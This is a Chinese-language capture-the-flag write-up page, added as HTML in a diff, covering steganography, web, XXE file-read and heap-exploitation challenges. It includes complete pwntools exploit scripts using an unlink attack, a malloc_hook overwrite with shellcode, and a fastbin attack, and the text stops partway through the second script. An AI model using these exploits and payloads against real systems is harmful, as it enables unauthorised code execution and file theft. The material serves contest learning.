@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="writeup,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="第四届中国创新挑战赛暨中关村第三届新兴领域专题赛网络与信息安全专项赛线上初赛writeup">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup | 网络与信息安全专项赛">
+<meta property="og:url" content="http://yoursite.com/2019/08/19/zgc_wp/index.html">
+<meta property="og:site_name" content="Waterdrop">
+<meta property="og:description" content="第四届中国创新挑战赛暨中关村第三届新兴领域专题赛网络与信息安全专项赛线上初赛writeup">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x00.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x01.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x01-1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x01-2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x01-3.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x01-4.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x01-5.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x02.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x02-1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x03.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x03-1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x03-2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x03-3.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x04.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x04-1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x04-2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x04-3.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x05.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x05-1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x05-n.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x07.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x08.png">
+<meta property="og:updated_time" content="2019-08-28T11:39:49.865Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Writeup | 网络与信息安全专项赛">
+<meta name="twitter:description" content="第四届中国创新挑战赛暨中关村第三届新兴领域专题赛网络与信息安全专项赛线上初赛writeup">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/19/zgc_wp/0x00.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/19/zgc_wp/">
+
+
+
+
+
+  <title>Writeup | 网络与信息安全专项赛 | Waterdrop</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Waterdrop</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/19/zgc_wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Waterdrop">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Waterdrop">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Writeup | 网络与信息安全专项赛</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-19T15:00:20+08:00">
+                2019-08-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>第四届中国创新挑战赛暨中关村第三届新兴领域专题赛网络与信息安全专项赛线上初赛writeup</p>
+<a id="more"></a>
+<p>第四届中国创新挑战赛暨中关村第三届新兴领域专题赛网络与信息安全专项赛线上初赛已经结束。以下是协会小伙伴们的writeup，供各位学习参考。</p>
+<h2 id="0x00-签到题"><a href="#0x00-签到题" class="headerlink" title="0x00 签到题"></a>0x00 签到题</h2><img src="/2019/08/19/zgc_wp/0x00.png">
+<h2 id="0x01-24word"><a href="#0x01-24word" class="headerlink" title="0x01 24word"></a>0x01 24word</h2><p>拿到题目，zsteg 发现存在 zip</p>
+<img src="/2019/08/19/zgc_wp/0x01.png">
+<p>foremost 提取，存在一个有密码的 zip </p>
+<img src="/2019/08/19/zgc_wp/0x01-1.png">
+<p>思路断了？开始搜社会主义核心价值观，然后找到了这个？ </p>
+<img src="/2019/08/19/zgc_wp/0x01-2.png">
+<p>解密后得到密码 </p>
+<img src="/2019/08/19/zgc_wp/0x01-3.png">
+<p>解密后得到一个图片</p>
+<img src="/2019/08/19/zgc_wp/0x01-4.png">
+<p>扫描二维码得到 flag </p>
+<img src="/2019/08/19/zgc_wp/0x01-5.jpg">
+<h2 id="0x02-Game"><a href="#0x02-Game" class="headerlink" title="0x02 Game"></a>0x02 Game</h2><p>查看源码</p>
+<img src="/2019/08/19/zgc_wp/0x02.png">
+<p>尝试直接发送 post score=15 于 score.php </p>
+<p>Flag 出来了？ </p>
+<img src="/2019/08/19/zgc_wp/0x02-1.png">
+<h2 id="0x03-七代目"><a href="#0x03-七代目" class="headerlink" title="0x03 七代目"></a>0x03 七代目</h2><img src="/2019/08/19/zgc_wp/0x03.png">
+<p>文件头错误，修改成 gif </p>
+<img src="/2019/08/19/zgc_wp/0x03-1.png">
+<p>根据 gif 出题思路，分解 gif 成帧 </p>
+<img src="/2019/08/19/zgc_wp/0x03-2.png">
+<p>根据题目提示，七代目？第 7 帧，得到 flag</p>
+<img src="/2019/08/19/zgc_wp/0x03-3.png">
+<h2 id="0x04-whoareyou"><a href="#0x04-whoareyou" class="headerlink" title="0x04 whoareyou?"></a>0x04 whoareyou?</h2><p>查看源码，显然 xxe</p>
+<img src="/2019/08/19/zgc_wp/0x04.png">
+<img src="/2019/08/19/zgc_wp/0x04-1.png">
+<p>利用 php 伪协议读取 index.php </p>
+<img src="/2019/08/19/zgc_wp/0x04-2.png">
+<p>Base64 解码得到 flag </p>
+<img src="/2019/08/19/zgc_wp/0x04-3.png">
+<h2 id="0x05-Yasaxi"><a href="#0x05-Yasaxi" class="headerlink" title="0x05 Yasaxi"></a>0x05 Yasaxi</h2><p>用 010editor 解析 zip，发现最后一段解析错误 </p>
+<img src="/2019/08/19/zgc_wp/0x05.png">
+<p>发现有 pass:loli，把这个删掉，然后对比正常的 zip 再微调一样，修复出来一个有密码的 zip 压缩包</p>
+<p>密码就是 loli，然后 strings 一波，看到最后有一大串字符串，由 .!?问号组成 </p>
+<p>一波搜索引擎，Ook!编码？</p>
+<img src="/2019/08/19/zgc_wp/0x05-1.png">
+<p>解码得到 flag</p>
+<p> <a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a> </p>
+<img src="/2019/08/19/zgc_wp/0x05-n.png">
+<h2 id="0x06-one-string"><a href="#0x06-one-string" class="headerlink" title="0x06 one_string"></a>0x06 one_string</h2><p>这题比较简单，edit 函数会用 strlen 更新长度，然后就有 off by one，可以修改下一个 chunk 的 size </p>
+<p>通过布置堆块，有堆溢出，然后再用 unlink attack，就有任意写，之后写一下 malloc_hook 就行了</p>
+<p>Payload 如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'df0a72047d6c.gamectf.com'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload+=x</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> payload</span><br><span class="line">    payload+=x+<span class="string">'\n'</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    se(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    se(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">    ru(<span class="string">'Please input you token:\n'</span>)</span><br><span class="line">    sl(<span class="string">'icq68eb9ea8ac6b069c375a9faa1e91b'</span>)</span><br><span class="line">    sss = <span class="string">'MQoyNTIKYWFhCjEKMjUyCmFhYQoxCjI1MgphYWEKMQoyNTIKYmJiCjEKMjUyCmNjYwozCjAKYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhMwowCmFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQEDMgoxCjEKNzY0CmNjYwozCjIKYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhMwoyCmFhYWFhYWFhPLoOCEC6DghhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh+AAAAAABMwoxCmFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQEBAAAAAAAAAAAACjIKMwozCjIK2KQOCNikDgjYpA4ITLoOCGpnaC9mbGGJ4zHJMdJqBVjNgGoBW4nBMdJo////f14xwLC7zYAKMwowCky6DggKMQo0MAo='</span></span><br><span class="line">    ru(<span class="string">'So, please give me a base64 strings:'</span>)</span><br><span class="line">    sl(sss)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'You know all, Please input:\n'</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'bbb\n'</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'ccc\n'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0xfc</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0xfc</span>+<span class="string">'\1\3'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x2fc</span>,<span class="string">'ccc\n'</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x80eba48</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0xfc</span>)</span><br><span class="line"><span class="comment">#edit(0,p32(0)+p32(0xf9)+p32(addr-0xc)+p32(addr-0x8)+'a'*0xe8+p32(0xf8)+'\0\1')</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">8</span>+p32(addr<span class="number">-0xc</span>)+p32(addr<span class="number">-0x8</span>)+<span class="string">'a'</span>*<span class="number">0xe8</span>+p32(<span class="number">0xf8</span>)+<span class="string">'\0\1'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0xfc</span>+p32(<span class="number">0x101</span>)+p32(<span class="number">0</span>)+<span class="string">'\0\0\0\n'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p32(<span class="number">0x80EA4D8</span>)*<span class="number">3</span>+p32(<span class="number">0x80eba4c</span>)+asm(shellcraft.cat(<span class="string">'/flag'</span>))+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x80eba4c</span>)+<span class="string">'\n'</span>)</span><br><span class="line">sl(<span class="string">'1\n40'</span>)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>FLAG: </strong></p>
+<p>flag{e168a5c525ee683a5fa298dc8afdeadf}</p>
+<h2 id="0x07-two-string"><a href="#0x07-two-string" class="headerlink" title="0x07 two_string"></a>0x07 two_string</h2><p>这题漏洞在于create一个size为0的string，当这个string上面有遗留的内容的时候</p>
+<p>可以利用merge_strings进行溢出</p>
+<p>这里是改chunk size，然后堆溢出，再fastbin attack</p>
+<p>Payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p=process('./pwn')</span></span><br><span class="line">    p=process(<span class="string">'./pwn'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.24.so'</span>&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'a32f094e35d7.gamectf.com'</span>,<span class="number">20001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x,timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Please enter the size of string :'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'Please enter the string :'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'index :'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'index :'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(idx1,idx2)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'index :'</span>)</span><br><span class="line">    sl(str(idx1))</span><br><span class="line">    ru(<span class="string">'index :'</span>)</span><br><span class="line">    sl(str(idx2))</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merges</span><span class="params">(idxs)</span>:</span></span><br><span class="line">    sl(<span class="string">'5'</span>)</span><br><span class="line">    ru(<span class="string">'strings to be merged : '</span>)</span><br><span class="line">    sl(idxs)</span><br><span class="line">    ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xa8</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">add(<span class="number">0xa8</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'Please enter the size of string :'</span>)</span><br><span class="line">sl(<span class="string">'0'</span>)</span><br><span class="line">ru(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span 